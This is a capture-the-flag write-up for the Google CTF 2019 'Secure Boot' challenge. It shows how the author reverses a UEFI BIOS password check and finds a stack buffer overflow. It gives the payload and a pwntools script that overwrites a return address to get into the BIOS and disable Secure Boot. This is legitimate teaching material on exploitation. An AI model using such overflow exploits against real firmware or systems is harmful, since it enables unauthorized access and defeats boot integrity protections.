---
layout: post
category: Pwn
title: Google CTF Quals 2019 - Secure Boot
tags: 
    - kowu
---

# Challenge overwiew

A x86\_64 qemu challenge. However, this time it is about getting it to boot up...

```
.
├── contents
│   ├── boot.nsh
│   ├── bzImage
│   ├── rootfs.cpio.gz
│   └── startup.nsh
├── OVMF.fd
└── run.py
```

Running the challenge and doing nothing gives us the following output:

```
UEFI Interactive Shell v2.2
EDK II
UEFI v2.70 (EDK II, 0x00010000)
Mapping table
      FS0: Alias(s):HD1a1:;BLK3:
          PciRoot(0x0)/Pci(0x1,0x1)/Ata(0x0)/HD(1,MBR,0xBE1AFDFA,0x3F,0xFBFC1)
     BLK0: Alias(s):
          PciRoot(0x0)/Pci(0x1,0x0)/Floppy(0x0)
     BLK1: Alias(s):
          PciRoot(0x0)/Pci(0x1,0x0)/Floppy(0x1)
     BLK2: Alias(s):
          PciRoot(0x0)/Pci(0x1,0x1)/Ata(0x0)
     BLK4: Alias(s):
          PciRoot(0x0)/Pci(0x1,0x1)/Ata(0x0)

If Secure Boot is enabled it will verify kernel's integrity and
return 'Security Violation' in case of inconsistency.
Booting...
Script Error Status: Security Violation (line number 5)
```

And execution stops. However, if we enter the "BIOS" by hitting `del` or `F12` we are greeted with the following:

```
BdsDxe: loading Boot0000 "UiApp" from Fv(7CB8BDC9-F8EB-4F34-AAEA-3EE4AF6516A1)/FvFile(462CAA21-7614-4503-836E-8AB6F4662331)
BdsDxe: starting Boot0000 "UiApp" from Fv(7CB8BDC9-F8EB-4F34-AAEA-3EE4AF6516A1)/FvFile(462CAA21-7614-4503-836E-8AB6F4662331)
****************************
*                          *
*   Welcome to the BIOS!   *
*                          *
****************************

Password?
```

This is where the challenge starts.

# Pre-Reversing

First of all, I modified the run.py script and added the `-s` option to qemu (-s ia a shorthand to wait for gdb connections on port 1234). I also removed the `console=/dev/null` as I want to use the console later on.

Now we can run the challenge until we get to the password input prompt. Once reached, we attach radare2 to it with `r2 -D gdb gdb://localhost:1234`. Radare will stop the execution. As the program is expecting input from us, we are probably currently in some kind of input routine. A backtrace should lead us to the calling functions.

Printing a backtrace reveals the following:

```
:> dbt
0  0x7b30a41          sp: 0x0                 0    [??]  rip r13+8403169
1  0x7ec22c9          sp: 0x7ec16c8           32   [??]  rsp+3105 
2  0x7ec5f50          sp: 0x7ec1728           96   [??]  rsp+18600 
3  0x7ed2fe7          sp: 0x7ec1758           48   [??]  rsp+71999 
4  0x7ed30c9          sp: 0x7ec1778           32   [??]  rsp+72225 
5  0x67daf5e          sp: 0x7ec17c8           80   [??]  cr3+108896862 
6  0x7b90612          sp: 0x7ec1828           96   [??]  rip+392145 
7  0x67d4d34          sp: 0x7ec18b8           144  [??]  cr3+108871732 
8  0x7ec5f50          sp: 0x7ec18f8           64   [??]  rsp+18600 
9  0x7ec8317          sp: 0x7ec1958           96   [??]  rsp+27759 
10  0x7a7e577          sp: 0x7ec1a28           208  [??]  r13+7672855 
```

I now went through all the call frames and looked for something interesting (in search for some main loop).
At frame 5 I noticed the use of `0xdeadbeefdeadbeef` (suspicious). Frame 7 checks a functions result and, depending on the output, calls another function with the string "Blocked". Therefore I assumed `0x67dae50` to be our password check routine we are interested in.

```
0x067d4d2f      e81c610000     call 0x67dae50              ;[1]
0x067d4d34      84c0           test al, al
0x067d4d36      7511           jne 0x67d4d49
0x067d4d38      488d0d1fa100.  lea rcx, [0x067dee5e]       ; u"\nBlocked!\n"
0x067d4d3f      e8b976ffff     call 0x67cc3fd
```

To confirm this, I placed a breakpoint on the `test al, al` instruction (`db 0x67d4d34`) and, once the breakpoint was hit, manually modified the return value from zero to one (`dr rax=1`).
Continuing execution (`dc`) results in a BIOS menu where I could turn off secure boot and initiate a reboot with the new BIOS settings. As a result, the system would start up normally.

# Reversing

As I identified the password input routine, it's time for reversing (using IDA). First, I dumped the whole guest memory via the qemu monitor (press `ctrl+a` then `c` and dump using `dump-guest-memory`).
We get some decompiled and cleaned up pseudocode like this (left some details away for simplicity):

```c
int checkpasswd() {
    uint64_t *hashptr;
    char keybuffer[128];

    hashptr = malloc(32);
    for (int tries=0; tries <= 2; tries++) {
        int i=0;
        for(; i<140; i++) {
            char c = getc();
            if (c == '\r')
                break;
            keybuffer[i] = c;
            print("*");
        }
        keybuffer[i] = '\0';
        /* assumed because of magic constants */
        sha256(32, i, keybuffer, hashptr); 
        if (hashptr[0x00] == 0xdeadbeefdeadbeef &&
            hashptr[0x08] == 0xdeadbeefdeadbeef &&
            hashptr[0x10] == 0xdeadbeefdeadbeef &&
            hashptr[0x18] == 0xdeadbeefdeadbeef)
            return 1;
        print("wrong!");
    }
    return 0;
}
```

So a classic stack based overflow (128B space vs. 141B usage). We overflow into the hashptr and therefore control where the 32 Bytes of resulting hash are written to. We can use this to bypass the login password check by partially overwriting our own return address.
So instead of returning to `0x67d4d34` we want to return to `0x67d4d49`, i.e. we need to change the first byte from `0x34` to `0x49`. The return address is located at `0x7ec18b8`, therefore we need to modify the hashptr to point to `0x7ec18b8 - 0x20 + 1 = 0x7ec1899`.
The payload for this looks like this:

```python
pl = "A" * 136 + struct.pack('<I', 0x07ec1899)
```

To overwrite the first byte of the return address with controlled data, one can bruteforce possible sha256 hashes.
During the ctf due to lazyness I just manually incremented the first char, as the possibility is > 1/256 to hit a valid bypass :)
Dirty, but I got a working payload quite fast this way.

```python
pl = "E" + "A" * 135 + struct.pack('<I', 0x07ec1899)
```

# Launching

We now have everything together to launch the exploit against the remote target.
The del keycode (0x7f) needs to be escaped (0x1b) and we need to wait some time before we can send it (therefore the recvn(1)).

```python
from pwn import *

r = remote('secureboot.ctfcompetition.com', 1337)

if __name__ == '__main__':
    r.recvn(1)
    r.send('\x1b\x7f')
    r.recvuntil('Password?')
    pl = "E" + "A" * 135 + struct.pack('<I', 0x07ec1899)
    r.send(pl + '\x0d')
    r.interactive()
```
launching with socat:
```
socat /dev/stdin,rawer "SYSTEM:python2 secureboot.py"
```
This will drop us into the BIOS options. There we need to deselect `Device Manager` -> `Secure Boot Configuration` -> `Attempt Secure Boot`. A reboot will start the machine and allows us to cat the flag.
